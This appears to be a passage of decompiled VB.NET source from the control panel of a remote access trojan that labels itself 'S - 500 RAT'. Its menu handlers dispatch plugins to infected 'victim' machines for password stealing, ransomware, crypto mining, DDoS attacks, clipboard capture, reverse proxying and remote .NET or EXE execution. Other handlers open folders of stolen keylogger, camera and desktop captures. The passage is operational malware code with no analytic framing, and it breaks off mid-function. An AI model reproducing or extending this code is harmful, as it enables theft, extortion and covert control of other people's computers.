		Private Sub PasswordStealerContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Password.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formPasswordBrowser As FormPasswordBrowser = CType(Application.OpenForms("FormPasswordBrowser" + clients.IpPort()), FormPasswordBrowser)
					Dim flag As Boolean = formPasswordBrowser Is Nothing
					If flag Then
						formPasswordBrowser = New FormPasswordBrowser() With { .Name = "FormPasswordBrowser" + clients.IpPort(), .F = Me, .Text = "Passwords", .ParentClient = clients }
						formPasswordBrowser.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formPasswordBrowser.WindowState = FormWindowState.Minimized
						formPasswordBrowser.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Passwords Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DA7 RID: 3495 RVA: 0x00079144 File Offset: 0x00077344
		Private Sub ReverseProxyContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\ReverseProxy.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formReverseProxy As FormReverseProxy = CType(Application.OpenForms("FormReverseProxy" + clients.IpPort()), FormReverseProxy)
					Dim flag As Boolean = formReverseProxy Is Nothing
					If flag Then
						formReverseProxy = New FormReverseProxy() With { .Name = "FormReverseProxy" + clients.IpPort(), .F = Me, .Text = "Reverse Proxy", .ParentClient = clients }
						formReverseProxy.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formReverseProxy.WindowState = FormWindowState.Minimized
						formReverseProxy.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Reverse Proxy Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DA8 RID: 3496 RVA: 0x000792C4 File Offset: 0x000774C4
		Private Sub NagrokContex_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000DA9 RID: 3497 RVA: 0x000792C8 File Offset: 0x000774C8
		Private Sub WIFIContexx_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\WiFi.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formWiFi As FormWiFi = CType(Application.OpenForms("FormWiFi" + clients.IpPort()), FormWiFi)
					Dim flag As Boolean = formWiFi Is Nothing
					If flag Then
						formWiFi = New FormWiFi() With { .Name = "FormWiFi" + clients.IpPort(), .F = Me, .Text = "WiFi", .ParentClient = clients }
						formWiFi.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formWiFi.WindowState = FormWindowState.Minimized
						formWiFi.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("WiFi Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DAA RID: 3498 RVA: 0x00079448 File Offset: 0x00077648
		Private Sub ConnectionContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\TCPConnection.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formTCPConnection As FormTCPConnection = CType(Application.OpenForms("FormTCPConnection" + clients.IpPort()), FormTCPConnection)
					Dim flag As Boolean = formTCPConnection Is Nothing
					If flag Then
						formTCPConnection = New FormTCPConnection() With { .Name = "FormTCPConnection" + clients.IpPort(), .F = Me, .Text = "Network", .ParentClient = clients }
						formTCPConnection.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formTCPConnection.WindowState = FormWindowState.Minimized
						formTCPConnection.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Network Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DAB RID: 3499 RVA: 0x000795C8 File Offset: 0x000777C8
		Private Sub HostsEditorContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Hosts.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formHosts As FormHosts = CType(Application.OpenForms("FrmHosts" + clients.IpPort()), FormHosts)
					Dim flag As Boolean = formHosts Is Nothing
					If flag Then
						formHosts = New FormHosts() With { .Name = "FrmHosts" + clients.IpPort(), .F = Me, .Text = "Hosts", .ParentClient = clients }
						formHosts.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formHosts.WindowState = FormWindowState.Minimized
						formHosts.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Hosts Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DAC RID: 3500 RVA: 0x00079748 File Offset: 0x00077948
		Private Sub MiningContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Mining.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formXMR As FormXMR = CType(Application.OpenForms("FormXMR" + clients.IpPort()), FormXMR)
					Dim flag As Boolean = formXMR Is Nothing
					If flag Then
						formXMR = New FormXMR() With { .Name = "FormXMR" + clients.IpPort(), .F = Me, .Text = "Mining", .ParentClient = clients }
						formXMR.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formXMR.WindowState = FormWindowState.Minimized
						formXMR.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Mining Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DAD RID: 3501 RVA: 0x000798C8 File Offset: 0x00077AC8
		Private Sub ClipboardContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Clipboard.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formClipboard As FormClipboard = CType(Application.OpenForms("FormClipboard" + clients.IpPort()), FormClipboard)
					Dim flag As Boolean = formClipboard Is Nothing
					If flag Then
						formClipboard = New FormClipboard() With { .Name = "FormClipboard" + clients.IpPort(), .F = Me, .Text = "Clipboard", .ParentClient = clients }
						formClipboard.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formClipboard.WindowState = FormWindowState.Minimized
						formClipboard.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Clipboard Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DAE RID: 3502 RVA: 0x00079A48 File Offset: 0x00077C48
		Private Sub RansomwareContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Ransomware.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formRansomware As FormRansomware = CType(Application.OpenForms("FormRansomware" + clients.IpPort()), FormRansomware)
					Dim flag As Boolean = formRansomware Is Nothing
					If flag Then
						formRansomware = New FormRansomware() With { .Name = "FormRansomware" + clients.IpPort(), .F = Me, .Text = "Ransomware", .ParentClient = clients }
						formRansomware.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formRansomware.WindowState = FormWindowState.Minimized
						formRansomware.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Ransomware Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DAF RID: 3503 RVA: 0x00079BC8 File Offset: 0x00077DC8
		Private Sub AntiMalwareContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\AntiMalware.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formAntiMalware As FormAntiMalware = CType(Application.OpenForms("FormAntiMalware" + clients.IpPort()), FormAntiMalware)
					Dim flag As Boolean = formAntiMalware Is Nothing
					If flag Then
						formAntiMalware = New FormAntiMalware() With { .Name = "FormAntiMalware" + clients.IpPort(), .F = Me, .Text = "AntiMalware", .ParentClient = clients }
						formAntiMalware.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formAntiMalware.WindowState = FormWindowState.Minimized
						formAntiMalware.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("AntiMalware Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DB0 RID: 3504 RVA: 0x00079D48 File Offset: 0x00077F48
		Private Sub ExecuteNETCodeContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\DotNet.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formDotNetEditor As FormDotNetEditor = CType(Application.OpenForms("FormDotNetEditor" + clients.IpPort()), FormDotNetEditor)
					Dim flag As Boolean = formDotNetEditor Is Nothing
					If flag Then
						formDotNetEditor = New FormDotNetEditor() With { .Name = "FormDotNetEditor" + clients.IpPort(), .F = Me, .Text = "DotNetEditor", .ParentClient = clients }
						formDotNetEditor.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formDotNetEditor.WindowState = FormWindowState.Minimized
						formDotNetEditor.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("DotNetEditor Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DB1 RID: 3505 RVA: 0x00079EC8 File Offset: 0x000780C8
		Private Sub MessageBoxContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\MessageBox.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formMessageBox As FormMessageBox = CType(Application.OpenForms("FormMessageBox" + clients.IpPort()), FormMessageBox)
					Dim flag As Boolean = formMessageBox Is Nothing
					If flag Then
						formMessageBox = New FormMessageBox() With { .Name = "FormMessageBox" + clients.IpPort(), .F = Me, .Text = "Message Box", .ParentClient = clients }
						formMessageBox.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formMessageBox.WindowState = FormWindowState.Minimized
						formMessageBox.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Message Box Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DB2 RID: 3506 RVA: 0x0007A048 File Offset: 0x00078248
		Private Sub DDosAttackContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\DDos.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formDDos As FormDDos = CType(Application.OpenForms("FormDDos" + clients.IpPort()), FormDDos)
					Dim flag As Boolean = formDDos Is Nothing
					If flag Then
						formDDos = New FormDDos() With { .Name = "FormDDos" + clients.IpPort(), .F = Me, .Text = "DDos Attack", .ParentClient = clients }
						formDDos.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formDDos.WindowState = FormWindowState.Minimized
						formDDos.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("DDos Attack Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DB3 RID: 3507 RVA: 0x0007A1C8 File Offset: 0x000783C8
		Private Sub OptionsContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Options.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formOptions As FormOptions = CType(Application.OpenForms("FormOptions" + clients.IpPort()), FormOptions)
					Dim flag As Boolean = formOptions Is Nothing
					If flag Then
						formOptions = New FormOptions() With { .Name = "FormOptions" + clients.IpPort(), .F = Me, .Text = "Options", .ParentClient = clients }
						formOptions.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formOptions.WindowState = FormWindowState.Minimized
						formOptions.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Options Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DB4 RID: 3508 RVA: 0x0007A348 File Offset: 0x00078548
		Private Sub FunContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Fun.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formFun As FormFun = CType(Application.OpenForms("FormFun" + clients.IpPort()), FormFun)
					Dim flag As Boolean = formFun Is Nothing
					If flag Then
						formFun = New FormFun() With { .Name = "FormFun" + clients.IpPort(), .F = Me, .Text = "Fun", .ParentClient = clients }
						formFun.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formFun.WindowState = FormWindowState.Minimized
						formFun.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Fun Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DB5 RID: 3509 RVA: 0x0007A4C8 File Offset: 0x000786C8
		Private Sub ChatContex_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\Chat.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formChat As FormChat = CType(Application.OpenForms("FormChat" + clients.IpPort()), FormChat)
					Dim flag As Boolean = formChat Is Nothing
					If flag Then
						formChat = New FormChat() With { .Name = "FormChat" + clients.IpPort(), .F = Me, .Text = "Chat", .ParentClient = clients }
						formChat.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formChat.WindowState = FormWindowState.Minimized
						formChat.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Chat Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DB6 RID: 3510 RVA: 0x0007A648 File Offset: 0x00078848
		Private Sub ClientContex_Click(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x06000DB7 RID: 3511 RVA: 0x0007A64C File Offset: 0x0007884C
		Private Sub ToolStripMenuItem34_Click(sender As Object, e As EventArgs)
			Try
				Dim text As String = Application.StartupPath + "\Clients"
				Dim flag As Boolean = Not Directory.Exists(text)
				If flag Then
					Directory.CreateDirectory(text)
					Process.Start(text)
				Else
					Process.Start(text)
				End If
			Catch ex As Exception
				ListLogs.AddArray("Open Folder Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DB8 RID: 3512 RVA: 0x0007A6CC File Offset: 0x000788CC
		Private Sub RenameClient_Click(sender As Object, e As EventArgs)
			Dim text As String = Interaction.InputBox("Enter New Name", "Rename Victim", String.Empty, -1, -1)
			Dim flag As Boolean = text.Length > 0
			If flag Then
				Try
					For Each [object] As Clients In Me.GetSelectedClients()
						Dim msgPack As MsgPack = New MsgPack()
						msgPack.ForcePathObject("Packet").SetAsString("Rename")
						msgPack.ForcePathObject("VN").SetAsString(text)
						ThreadPool.QueueUserWorkItem(AddressOf [object].SendByte, msgPack.Encode2Bytes())
					Next
					Try
						For Each obj As Object In Me.L1.SelectedRows
							Dim dataGridViewRow As DataGridViewRow = CType(obj, DataGridViewRow)
							Try
								dataGridViewRow.Cells(1).Value = text
							Catch ex As Exception
							End Try
						Next
					Catch ex2 As Exception
					End Try
				Catch ex3 As Exception
					ListLogs.AddArray("Rename Client Error : " + ex3.Message, 0)
				End Try
			End If
		End Sub

		' Token: 0x06000DB9 RID: 3513 RVA: 0x0007A844 File Offset: 0x00078A44
		Private Sub UpdateClient_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count <> 0
			If flag Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .Filter = "EXE|*.exe", .FileName = String.Empty }
				Dim flag2 As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
				If flag2 Then
					Try
						For Each [object] As Clients In Me.GetSelectedClients()
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").SetAsString("Update")
							msgPack.ForcePathObject("Filename").SetAsString(New FileInfo(openFileDialog.FileName).Name)
							msgPack.ForcePathObject("byte").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)))
							ThreadPool.QueueUserWorkItem(AddressOf [object].SendByte, msgPack.Encode2Bytes())
						Next
					Catch ex As Exception
						ListLogs.AddArray("Update Client Error : " + ex.Message, 0)
					End Try
				End If
			End If
		End Sub

		' Token: 0x06000DBA RID: 3514 RVA: 0x0007A984 File Offset: 0x00078B84
		Private Sub SupportClient_Click(sender As Object, e As EventArgs)
			Try
				For Each clients As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("GetPLG")
					msgPack.ForcePathObject("IDHash").SetAsString(GetHash.GetChecksum("Plugins\SClient.dll"))
					msgPack.ForcePathObject("ID").SetAsString(clients.IpPort())
					msgPack.ForcePathObject("Chack").SetAsString(Conversions.ToString(True))
					Dim formClient As FormClient = CType(Application.OpenForms("FormClient" + clients.IpPort()), FormClient)
					Dim flag As Boolean = formClient Is Nothing
					If flag Then
						formClient = New FormClient() With { .Name = "FormClient" + clients.IpPort(), .F = Me, .Text = "Client", .ParentClient = clients }
						formClient.Show()
						ThreadPool.QueueUserWorkItem(AddressOf clients.SendByte, msgPack.Encode2Bytes())
					Else
						formClient.WindowState = FormWindowState.Minimized
						formClient.WindowState = FormWindowState.Normal
					End If
				Next
			Catch ex As Exception
				ListLogs.AddArray("Support Client Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DBB RID: 3515 RVA: 0x0007AB04 File Offset: 0x00078D04
		Private Sub CloseClient_Click(sender As Object, e As EventArgs)
			Try
				For Each [object] As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("Close")
					ThreadPool.QueueUserWorkItem(AddressOf [object].SendByte, msgPack.Encode2Bytes())
				Next
			Catch ex As Exception
				ListLogs.AddArray("Close Client Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DBC RID: 3516 RVA: 0x0007ABA4 File Offset: 0x00078DA4
		Private Sub RestartClient_Click(sender As Object, e As EventArgs)
			Try
				For Each [object] As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("Restart")
					ThreadPool.QueueUserWorkItem(AddressOf [object].SendByte, msgPack.Encode2Bytes())
				Next
			Catch ex As Exception
				ListLogs.AddArray("Restart Client Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DBD RID: 3517 RVA: 0x0007AC44 File Offset: 0x00078E44
		Private Sub Unistall_Click(sender As Object, e As EventArgs)
			Try
				For Each [object] As Clients In Me.GetSelectedClients()
					Dim msgPack As MsgPack = New MsgPack()
					msgPack.ForcePathObject("Packet").SetAsString("Unistall")
					ThreadPool.QueueUserWorkItem(AddressOf [object].SendByte, msgPack.Encode2Bytes())
				Next
			Catch ex As Exception
				ListLogs.AddArray("Unistall Client Error : " + ex.Message, 0)
			End Try
		End Sub

		' Token: 0x06000DBE RID: 3518 RVA: 0x0007ACE4 File Offset: 0x00078EE4
		Private Sub RunFileClient_Click(sender As Object, e As EventArgs)
			Dim flag As Boolean = Me.L1.SelectedRows.Count > 0
			If flag Then
				Dim openFileDialog As OpenFileDialog = New OpenFileDialog() With { .Filter = "EXE|*.exe", .FileName = String.Empty }
				Dim flag2 As Boolean = openFileDialog.ShowDialog() = DialogResult.OK
				If flag2 Then
					Try
						For Each [object] As Clients In Me.GetSelectedClients()
							Dim msgPack As MsgPack = New MsgPack()
							msgPack.ForcePathObject("Packet").SetAsString("RunFile")
							msgPack.ForcePathObject("File").SetAsString(New FileInfo(openFileDialog.FileName).Name)
							msgPack.ForcePathObject("bytes").SetAsBytes(Zip.Compress(File.ReadAllBytes(openFileDialog.FileName)))
							ThreadPool.QueueUserWorkItem(AddressOf [object].SendByte, msgPack.Encode2Bytes())
						Next
					Catch ex As Exception
						ListLogs.AddArray("Run File Error : " + ex.Message, 0)
					End Try
				End If
			End If
		End Sub

		' Token: 0x06000DBF RID: 3519 RVA: 0x0007AE24 File Offset: 0x00079024
		Private Sub FolderDownload_Click(sender As Object, e As EventArgs)
			Dim left As String = Application.StartupPath + "\Clients\Downloads\"
			Dim flag As Boolean = Me.L1.Rows.Count > 0
			If flag Then
				Try
					Dim enumerator As IEnumerator = Me.L1.SelectedRows.GetEnumerator()
					If enumerator.MoveNext() Then
						Dim dataGridViewRow As DataGridViewRow = CType(enumerator.Current, DataGridViewRow)
						Dim text As String = Conversions.ToString(Operators.ConcatenateObject(left, dataGridViewRow.Cells(3).Value))
						Dim flag2 As Boolean = Directory.Exists(text)
						If flag2 Then
							Process.Start(text)
						Else
							MessageBox.Show("The download folder for this client was not found", "S - 500 RAT | Open Folder !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						End If
					End If
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000DC0 RID: 3520 RVA: 0x0007AEF8 File Offset: 0x000790F8
		Private Sub FolderKeylogger_Click(sender As Object, e As EventArgs)
			Dim left As String = Application.StartupPath + "\Clients\Keylogger\"
			Dim flag As Boolean = Me.L1.Rows.Count > 0
			If flag Then
				Try
					Dim enumerator As IEnumerator = Me.L1.SelectedRows.GetEnumerator()
					If enumerator.MoveNext() Then
						Dim dataGridViewRow As DataGridViewRow = CType(enumerator.Current, DataGridViewRow)
						Dim text As String = Conversions.ToString(Operators.ConcatenateObject(left, dataGridViewRow.Cells(3).Value))
						Dim flag2 As Boolean = Directory.Exists(text)
						If flag2 Then
							Process.Start(text)
						Else
							MessageBox.Show("The keylogger folder for this client was not found", "S - 500 RAT | Open Folder !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						End If
					End If
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000DC1 RID: 3521 RVA: 0x0007AFCC File Offset: 0x000791CC
		Private Sub FolderPassword_Click(sender As Object, e As EventArgs)
			Dim left As String = Application.StartupPath + "\Clients\Passwords2\"
			Dim flag As Boolean = Me.L1.Rows.Count > 0
			If flag Then
				Try
					Dim enumerator As IEnumerator = Me.L1.SelectedRows.GetEnumerator()
					If enumerator.MoveNext() Then
						Dim dataGridViewRow As DataGridViewRow = CType(enumerator.Current, DataGridViewRow)
						Dim text As String = Conversions.ToString(Operators.ConcatenateObject(left, dataGridViewRow.Cells(3).Value))
						Dim flag2 As Boolean = Directory.Exists(text)
						If flag2 Then
							Process.Start(text)
						Else
							MessageBox.Show("The Passwords folder for this client was not found", "S - 500 RAT | Open Folder !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						End If
					End If
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000DC2 RID: 3522 RVA: 0x0007B0A0 File Offset: 0x000792A0
		Private Sub FolderRansomware_Click(sender As Object, e As EventArgs)
			Dim left As String = Application.StartupPath + "\Clients\Ransomware\"
			Dim flag As Boolean = Me.L1.Rows.Count > 0
			If flag Then
				Try
					Dim enumerator As IEnumerator = Me.L1.SelectedRows.GetEnumerator()
					If enumerator.MoveNext() Then
						Dim dataGridViewRow As DataGridViewRow = CType(enumerator.Current, DataGridViewRow)
						Dim text As String = Conversions.ToString(Operators.ConcatenateObject(left, dataGridViewRow.Cells(3).Value))
						Dim flag2 As Boolean = Directory.Exists(text)
						If flag2 Then
							Process.Start(text)
						Else
							MessageBox.Show("The Ransomware folder for this client was not found", "S - 500 RAT | Open Folder !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						End If
					End If
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000DC3 RID: 3523 RVA: 0x0007B174 File Offset: 0x00079374
		Private Sub RemoteCamera_Click(sender As Object, e As EventArgs)
			Dim left As String = Application.StartupPath + "\Clients\Remote Camera\"
			Dim flag As Boolean = Me.L1.Rows.Count > 0
			If flag Then
				Try
					Dim enumerator As IEnumerator = Me.L1.SelectedRows.GetEnumerator()
					If enumerator.MoveNext() Then
						Dim dataGridViewRow As DataGridViewRow = CType(enumerator.Current, DataGridViewRow)
						Dim text As String = Conversions.ToString(Operators.ConcatenateObject(left, dataGridViewRow.Cells(3).Value))
						Dim flag2 As Boolean = Directory.Exists(text)
						If flag2 Then
							Process.Start(text)
						Else
							MessageBox.Show("The Remote Camera folder for this client was not found", "S - 500 RAT | Open Folder !", MessageBoxButtons.OK, MessageBoxIcon.Exclamation)
						End If
					End If
				Catch ex As Exception
				End Try
			End If
		End Sub

		' Token: 0x06000DC4 RID: 3524 RVA: 0x0007B248 File Offset: 0x00079448
		Private Sub FolderDesktop_Click(sender As Object, e As EventArgs)
			Dim left As String = Application.StartupPath + "\Clients\Remote Desktop\"
			Dim flag As Boolean = Me.L1.Rows.Count > 0
			If flag Then
				Try
					Dim enumerator As IEnumerator = Me.L1.SelectedRows.GetEnumerator()
					If enumerator.MoveNext() Then
						Dim dataGridViewRow As DataGridViewRow = CType(enumerator.Current, DataGridViewRow)
						Dim text As String = Conversions.ToString(Operators.ConcatenateObject(left, dataGridViewRow.Cells(3).Value))
						Dim flag2 As Boolean = Directory.Exists(text)
						If flag2 Then
							Process.Start(text)
						Else
